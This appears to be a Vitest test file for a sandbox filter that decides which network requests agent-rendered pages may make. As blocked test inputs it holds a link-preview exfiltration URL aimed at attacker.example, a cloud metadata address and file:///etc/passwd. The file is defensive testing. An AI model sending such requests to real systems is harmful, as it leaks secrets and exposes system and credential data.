import { describe, expect, it } from "vitest";
import { isAgentPageUrl } from "../shared/agent-page-url";
import { agentPageRequestAllowed } from "./render-frame-network";

const render = "http://127.0.0.1:3042/api/v1/sessions/p-1/renders/r1";
const artifact = "http://127.0.0.1:3042/api/v1/sessions/p-1/artifact-files/q3/report.html";
const inline = "http://ao-inline-artifact.x.localhost:3042/q3/report.html";
const resolveTo = (address: string, family = 4) => async () => [{ address, family }];

describe("isAgentPageUrl", () => {
	it("knows the frames that hold agent pages", () => {
		expect(isAgentPageUrl(render)).toBe(true);
		expect(isAgentPageUrl("http://localhost:3042/api/v1/sessions/p-1/artifact-files/q3/report.html")).toBe(true);
		expect(isAgentPageUrl(inline)).toBe(true);
	});

	it("leaves the app and everything else alone", () => {
		expect(isAgentPageUrl("http://localhost:5173/")).toBe(false);
		expect(isAgentPageUrl("app://renderer/index.html")).toBe(false);
		expect(isAgentPageUrl("http://127.0.0.1:3042/api/v1/sessions")).toBe(false);
		expect(isAgentPageUrl("http://ao-preview-artifact.x.localhost:3042/q3/report.html")).toBe(false);
		expect(isAgentPageUrl("https://docs.example/api/v1/sessions/p-1/renders/r1")).toBe(false);
		expect(isAgentPageUrl("not a url")).toBe(false);
	});
});

describe("agentPageRequestAllowed", () => {
	it("lets a page load public addresses, data and blob URLs", async () => {
		expect(await agentPageRequestAllowed("https://cdn.example/chart.js", render, resolveTo("93.184.216.34"))).toBe(true);
		expect(await agentPageRequestAllowed("https://93.184.216.34/x.png", render)).toBe(true);
		expect(await agentPageRequestAllowed("data:image/png;base64,iVBORw0KGgo=", render)).toBe(true);
		expect(await agentPageRequestAllowed("blob:http://ao-inline-artifact.x.localhost:3042/1", inline)).toBe(true);
	});

	it("lets a page load its own files", async () => {
		expect(await agentPageRequestAllowed(render, render)).toBe(true);
		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-1/artifact-files/q3/chart.png", artifact)).toBe(true);
		expect(await agentPageRequestAllowed("http://localhost:3042/api/v1/sessions/p-1/artifact-files/data.json", artifact)).toBe(true);
		expect(await agentPageRequestAllowed("http://ao-inline-artifact.x.localhost:3042/q3/data.json", inline)).toBe(true);
	});

	it("refuses the daemon's API, which answers a request with no Origin, and other sessions' files", async () => {
		const linkPreview = "http://127.0.0.1:3042/api/v1/link-preview?url=https://attacker.example/?d=secret";
		for (const page of [render, artifact, inline]) expect(await agentPageRequestAllowed(linkPreview, page)).toBe(false);
		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-1/renders/r2", render)).toBe(false);
		expect(await agentPageRequestAllowed("http://127.0.0.1:3042/api/v1/sessions/p-2/artifact-files/a.html", artifact)).toBe(false);
		expect(await agentPageRequestAllowed("http://ao-inline-artifact.y.localhost:3042/a.html", inline)).toBe(false);
	});

	it("refuses an inline artifact's frame on its session's preview origin, which the daemon trusts", async () => {
		expect(await agentPageRequestAllowed("http://ao-preview-artifact.x.localhost:3042/evil.html", inline)).toBe(false);
		expect(await agentPageRequestAllowed("http://ao-preview.x.localhost:3042/", inline)).toBe(false);
	});

	it("refuses this computer's other ports and the local network", async () => {
		expect(await agentPageRequestAllowed("http://127.0.0.1:8888/api", render)).toBe(false);
		expect(await agentPageRequestAllowed("http://localhost:5173/", render)).toBe(false);
		expect(await agentPageRequestAllowed("http://192.168.1.1/cgi-bin/admin", render)).toBe(false);
		expect(await agentPageRequestAllowed("http://[::1]:22/", render)).toBe(false);
		expect(await agentPageRequestAllowed("ws://10.0.0.5:9000/", render)).toBe(false);
		expect(await agentPageRequestAllowed("http://169.254.169.254/latest/meta-data/", render)).toBe(false);
	});

	it("refuses a name that resolves to this computer or its network, even on the daemon's port", async () => {
		expect(await agentPageRequestAllowed("http://router.lan/", render, resolveTo("192.168.1.1"))).toBe(false);
		expect(await agentPageRequestAllowed("http://localtest.example:3042/api/v1/sessions/p-1/renders/r1", render, resolveTo("127.0.0.1"))).toBe(false);
	});

	it("refuses other schemes", async () => {
		expect(await agentPageRequestAllowed("file:///etc/passwd", render)).toBe(false);
		expect(await agentPageRequestAllowed("not a url", render)).toBe(false);
	});
});
